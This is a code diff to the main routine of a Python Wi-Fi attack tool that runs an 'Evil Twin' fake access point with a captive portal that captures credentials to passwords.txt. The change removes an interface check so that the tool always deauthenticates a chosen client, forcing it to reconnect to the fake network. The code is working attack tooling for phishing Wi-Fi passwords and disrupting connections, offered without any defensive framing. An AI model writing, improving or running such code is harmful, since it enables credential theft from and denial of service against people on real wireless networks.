@@ -171,30 +171,24 @@ def main():
                                     print("[*] Captive portal waiting for credentials at 192.168.0.1")
                                     print("[*] Captured credentials will be saved to: passwords.txt")
 
-                                    # Perform deauth after AP and portal started
-                                    if deauth_interface == ap_interface:
-                                        print("\n[WARNING] Cannot deauth from wlan0 while AP is active on it")
-                                        print("[!] Clients must disconnect naturally or be deauth'd manually")
-                                        print("[!] Evil Twin is running and waiting for connections...")
-                                    else:
-                                        print(f"\n[*] Deauthing client {client_mac} for {ONE_MINUTE_SCAN} seconds...")
-                                        print(f"[*] Using {deauth_interface} for deauth attacks")
-                                        print("[*] Client should reconnect to our fake AP on wlan0")
+                                    print(f"\n[*] Deauthing client {client_mac} for {ONE_MINUTE_SCAN} seconds...")
+                                    print(f"[*] Using {deauth_interface} for deauth attacks")
+                                    print("[*] Client should reconnect to our fake AP on wlan0")
 
-                                        network.stop_sniffing()
-                                        sniff_thread.join()
+                                    network.stop_sniffing()
+                                    sniff_thread.join()
 
-                                        dauth.start_attack(client_mac, target_bssid, deauth_interface, ONE_MINUTE_SCAN)
+                                    dauth.start_attack(client_mac, target_bssid, deauth_interface, ONE_MINUTE_SCAN)
 
-                                        # Wait for attack with progress
-                                        for i in range(ONE_MINUTE_SCAN):
-                                            if not dauth.is_attack_running():
-                                                break
-                                            time.sleep(1)
-                                        print("\n")
+                                    # Wait for attack with progress
+                                    for i in range(ONE_MINUTE_SCAN):
+                                        if not dauth.is_attack_running():
+                                            break
+                                        time.sleep(1)
+                                    print("\n")
 
-                                        dauth.stop_attack()
-                                        print("[✓] Deauth completed!")
+                                    dauth.stop_attack()
+                                    print("[✓] Deauth completed!")
 
                                     # Keep running until user stops
                                     input("\nPress Enter to stop Evil Twin and return to scanning...")
